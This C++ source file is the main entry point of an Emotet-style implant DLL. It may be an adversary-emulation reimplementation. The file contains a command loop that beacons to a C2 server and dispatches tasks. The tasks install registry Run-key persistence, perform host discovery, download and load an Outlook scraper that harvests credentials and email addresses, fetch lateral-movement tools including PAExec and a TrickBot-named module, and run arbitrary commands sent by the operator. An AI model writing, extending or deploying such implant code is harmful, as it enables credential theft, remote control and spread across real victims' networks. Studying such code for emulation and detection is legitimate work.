// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "dllmain.h"
#include "persistence.h"
#include "hostdiscovery.h"
#include "loadoutlookscraper.h"
#include "latmove.h"
#include "comms.h"

// Starts DLL execution
bool Control_RunDLL() {

    // Create comms object to communicate with C2
    EmotetComms* commsObj = new EmotetComms;

    while (true) {

        // Go to sleep for 10 seconds
        Sleep(10000);

        // Register implant to C2 server
        if (commsObj->registerImplant()) {
            // Check for command
            string task = commsObj->getTask();

            if (!task.empty()) {
                if (task.compare("1") == 0) {
                    InstallPersistence(commsObj); // Persistence via Run key
                }
                else if (task.compare("2") == 0) {
                    HostDiscovery(commsObj);
                }
                else if (task.compare("3") == 0) {
                    string module = "outlook";
                    string moduleName = "Outlook.dll";
                    string outlookModulePath = commsObj->getModulePath(moduleName);
                    commsObj->installModule(module, outlookModulePath);
                }
                else if (task.compare("4") == 0) {
                    string moduleName = "Outlook.dll";
                    string outlookModulePath = commsObj->getModulePath(moduleName);
                    loadOutlookScraper(commsObj, outlookModulePath);
                }
                else if (task.compare("5") == 0) {
                    getCredentialsOutlookScraper(commsObj, false, false);
                }
                else if (task.compare("6") == 0) {
                    getCredentialsOutlookScraper(commsObj, true, false);
                }
                else if (task.compare("7") == 0) {
                    getCredentialsOutlookScraper(commsObj, true, true);
                }
                else if (task.compare("8") == 0) {
                    getEmailAddressesOutlookScraper(commsObj, false, false);
                }
                else if (task.compare("9") == 0) {
                    getEmailAddressesOutlookScraper(commsObj, true, false);
                }
                else if (task.compare("10") == 0) {
                    getEmailAddressesOutlookScraper(commsObj, true, true);
                }
                else if (task.compare("11") == 0) {
                    string module = "latmove";
                    string moduleName = "LatMovementDLL.dll";
                    string latMovPath = commsObj->getModulePath(moduleName);
                    commsObj->installModule(module, latMovPath);
                }
                else if (task.compare("12") == 0) {
                    string moduleName = "LatMovementDLL.dll";
                    string latMovementPath = commsObj->getModulePath(moduleName);
                    loadLatMovementModule(commsObj, latMovementPath);
                }
                else if (task.compare("13") == 0) {
                    string module = "WNetval";
                    string moduleName = "WNetval.zip";
                    string trickbotPath = commsObj->getModulePath(moduleName);
                    commsObj->installModule(module, trickbotPath);
                }
                else if (task.compare("14") == 0) {
                    string module = "paexec";
                    string moduleName = "PAExec.exe";
                    string latMovPath = commsObj->getModulePath(moduleName);
                    commsObj->installModule(module, latMovPath);
                }
                else if (task.rfind("cmd ", 0) == 0) {
                    int position = task.find(" ", 0);
                    string command = task.substr(position + 1);
                    executeLatMovementCmd(commsObj, command);
                }
                else {
                    commsObj->sendOutput("did not find requested task");
                }
            }
        }
    }
    return true;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

